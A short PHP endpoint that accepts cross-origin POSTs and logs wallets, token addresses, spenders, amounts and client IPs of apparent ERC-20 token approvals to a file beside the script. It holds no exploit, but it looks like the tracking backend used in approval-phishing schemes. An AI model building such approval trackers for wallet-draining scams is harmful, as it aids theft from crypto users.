<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

$rawBody = file_get_contents('php://input');
$data = json_decode($rawBody, true);
if (!is_array($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Invalid JSON body']);
    exit;
}

$wallet = isset($data['wallet']) ? trim($data['wallet']) : '';
$token = isset($data['token']) ? trim($data['token']) : '';
$spender = isset($data['spender']) ? trim($data['spender']) : '';
$amount = isset($data['amount']) ? trim($data['amount']) : '';

if (!preg_match('/^0x[a-fA-F0-9]{40}$/', $wallet)) {
    http_response_code(422);
    echo json_encode(['ok' => false, 'error' => 'Invalid wallet address']);
    exit;
}

// Log JSON lines for easy ingestion
$entry = [
    'ts' => gmdate('c'),
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'wallet' => $wallet,
    'token' => $token,
    'spender' => $spender,
    'amount' => $amount,
];
$logFile = __DIR__ . DIRECTORY_SEPARATOR . 'approvals.log';
if (@file_put_contents($logFile, json_encode($entry) . "\n", FILE_APPEND | LOCK_EX) === false) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Failed to write log']);
    exit;
}

echo json_encode(['ok' => true]);
exit;
?>


